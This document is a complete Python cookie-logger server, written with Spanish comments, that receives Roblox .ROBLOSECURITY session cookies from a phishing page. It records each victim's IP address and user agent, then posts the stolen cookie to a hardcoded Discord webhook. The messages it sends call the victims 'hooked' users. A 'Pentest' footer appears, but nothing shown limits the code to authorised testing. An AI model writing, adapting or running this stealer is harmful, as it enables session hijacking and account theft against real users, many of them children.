#!/usr/bin/env python3
import sys
import json
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import requests
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1469729710995935244/udKvatJq89y_5hE6SFkDlfaq2uV2EqowECVQaJmwOnP5vV4JUjW9C48dhDQcV6JjL8NA"

class LoggerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/logger.py':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            
            if 'roblox_cookie' in params and params['roblox_cookie'][0]:
                cookie = params['roblox_cookie'][0]
                user_agent = params.get('user_agent', [''])[0] or self.headers.get('User-Agent', 'Unknown')
                ip = self.client_address[0]
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                
                # Guardar en cookies.log
                log_data = {
                    'timestamp': timestamp,
                    'ip': ip,
                    'user_agent': user_agent,
                    'cookie': cookie
                }
                with open('cookies.log', 'a') as f:
                    f.write(json.dumps(log_data, indent=2) + '\n\n')
                
                # Enviar Discord
                embed = {
                    'title': '🎮 DISCORD PHISH - COOKIE ROBADA',
                    'description': '**Usuario picado!** 🎣',
                    'color': 16711680,
                    'fields': [
                        {'name': '🌐 IP', 'value': f'`{ip}`', 'inline': True},
                        {'name': '🕐 Capturada', 'value': f'`{timestamp}`', 'inline': True},
                        {'name': '📱 User-Agent', 'value': f'```{user_agent[:80]}...```', 'inline': False},
                        {'name': '🍪 .ROBLOSECURITY', 'value': f'```{cookie}```', 'inline': False}
                    ],
                    'footer': {'text': 'Pentest BS9reddp | jyqr4'}
                }
                requests.post(WEBHOOK_URL, json={'embeds': [embed]})
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())
            else:
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Silenciar logs

if __name__ == '__main__':
    os.system('clear')
    print("🚀 Discord Cookie Logger (Python) ACTIVADO")
    print("📱 URL: http://0.0.0.0:8080")
    print("📊 Logs: tail -f cookies.log")
    print("-" * 50)
    server = HTTPServer(('0.0.0.0', 8080), LoggerHandler)
    server.serve_forever()
